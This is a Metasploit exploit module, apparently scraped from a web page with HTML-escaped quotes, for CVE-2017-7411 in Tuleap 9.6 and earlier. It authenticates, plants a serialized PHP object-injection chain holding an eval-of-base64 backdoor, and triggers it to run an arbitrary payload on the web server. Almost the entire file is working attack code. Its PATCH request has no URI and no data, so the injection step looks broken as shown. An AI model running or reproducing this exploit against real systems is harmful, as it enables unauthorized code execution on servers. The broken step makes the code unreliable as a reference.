# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Tuleap 9.6 Second-Order PHP Object Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a Second-Order PHP Object Injection vulnerability in Tuleap <= 9.6 which
        could be abused by authenticated users to execute arbitrary PHP code with the permissions of the
        webserver. The vulnerability exists because of the User::getRecentElements() method is using the
        unserialize() function with data that can be arbitrarily manipulated by a user through the REST
        API interface. The exploit&#039;s POP chain abuses the __toString() method from the Mustache class
        to reach a call to eval() in the Transition_PostActionSubFactory::fetchPostActions() method.
      },
      &#039;Author&#039;         => &#039;EgiX&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://karmainsecurity.com/KIS-2017-02&#039;],
          [&#039;URL&#039;, &#039;https://tuleap.net/plugins/tracker/?aid=10118&#039;],
          [&#039;CVE&#039;, &#039;2017-7411&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [ [&#039;Tuleap <= 9.6&#039;, {}] ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 23 2017&#039;
      ))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, "The base path to the web application", "/"]),
          OptString.new(&#039;USERNAME&#039;, [true, "The username to authenticate with" ]),
          OptString.new(&#039;PASSWORD&#039;, [true, "The password to authenticate with" ]),
          OptInt.new(&#039;AID&#039;, [ false, "The Artifact ID you have access to", "1"]),
          Opt::RPORT(443)
        ])
  end

  def setup_popchain(random_param)
    print_status("Trying to login through the REST API...")

    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;api/tokens&#039;),
      &#039;ctype&#039;     => &#039;application/json&#039;,
      &#039;data&#039;      => {&#039;username&#039; => user, &#039;password&#039; => pass}.to_json
    })

    unless res && (res.code == 201 || res.code == 200) && res.body
      msg = "Login failed with #{user}:#{pass}"
      print_error(msg) if @is_check
      fail_with(Failure::NoAccess, msg)
    end

    body  = JSON.parse(res.body)
    uid   = body[&#039;user_id&#039;]
    token = body[&#039;token&#039;]

    print_good("Login successful with #{user}:#{pass}")

    php_code = "null;eval(base64_decode($_POST[&#039;#{random_param}&#039;]));//"

    pop_chain =  &#039;a:1:{i:0;a:1:{&#039;
    pop_chain << &#039;s:2:"id";O:8:"Mustache":2:{&#039;
    pop_chain << &#039;S:12:"\00*\00_template";&#039;
    pop_chain << &#039;s:42:"{{#fetchPostActions}}{{/fetchPostActions}}";&#039;
    pop_chain << &#039;S:11:"\00*\00_context";a:1:{&#039;
    pop_chain << &#039;i:0;O:34:"Transition_PostAction_FieldFactory":1:{&#039;
    pop_chain << &#039;S:23:"\00*\00post_actions_classes";a:1:{&#039;
    pop_chain << "i:0;s:#{php_code.length}:\"#{php_code}\";}}}}}}"


    res = send_request_cgi({
      &#039;method&#039;    => &#039;PATCH&#039;,
      &#039;ctype&#039;     => &#039;application/json&#039;,
      &#039;headers&#039;   => {&#039;X-Auth-Token&#039; => token, &#039;X-Auth-UserId&#039; => uid},
    })

    unless res && res.code == 200
      msg = "Something went wrong"
      print_error(msg) if @is_check
      fail_with(Failure::UnexpectedReply, msg)
    end
  end

  def do_login
    print_status("Retrieving the CSRF token for login...")

    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;account/login.php&#039;)
    })

    if res && res.code == 200 && res.body && res.get_cookies
      if res.body =~ /name="challenge" value="(\w+)">/
        csrf_token = $1
        print_good("CSRF token: #{csrf_token}")
      else
        print_warning("CSRF token not found. Trying to login without it...")
      end
    else
      msg = "Failed to retrieve the login page"
      print_error(msg) if @is_check
      fail_with(Failure::NoAccess, msg)
    end

    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;cookie&#039;    => res.get_cookies,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;account/login.php&#039;),
      &#039;vars_post&#039; => {&#039;form_loginname&#039; => user, &#039;form_pw&#039; => pass, &#039;challenge&#039; => csrf_token}
    })

    unless res && res.code == 302
      msg = "Login failed with #{user}:#{pass}"
      print_error(msg) if @is_check
      fail_with(Failure::NoAccess, msg)
    end

    print_good("Login successful with #{user}:#{pass}")
    res.get_cookies
  end

  def exec_php(php_code)
    random_param = rand_text_alpha(10)

    setup_popchain(random_param)
    session_cookies = do_login()

    print_status("Triggering the POP chain...")

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, "plugins/tracker/?aid=#{datastore[&#039;AID&#039;]}"),
      &#039;cookie&#039;    => session_cookies,
      &#039;vars_post&#039; => {random_param => Rex::Text.encode_base64(php_code)}
    })

    if res && res.code == 200 && res.body =~ /Exiting with Error/
      msg = "No access to Artifact ID #{datastore[&#039;AID&#039;]}"
      @is_check ? print_error(msg) : fail_with(Failure::NoAccess, msg)
    end

    res
  end

  def check
    @is_check = true
    flag = rand_text_alpha(rand(10)+20)
    res  = exec_php("print &#039;#{flag}&#039;;")

    if res && res.code == 200 && res.body =~ /#{flag}/
      return Exploit::CheckCode::Vulnerable
    elsif res && res.body =~ /Exiting with Error/
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    @is_check = false
    exec_php(payload.encoded)
  end
end

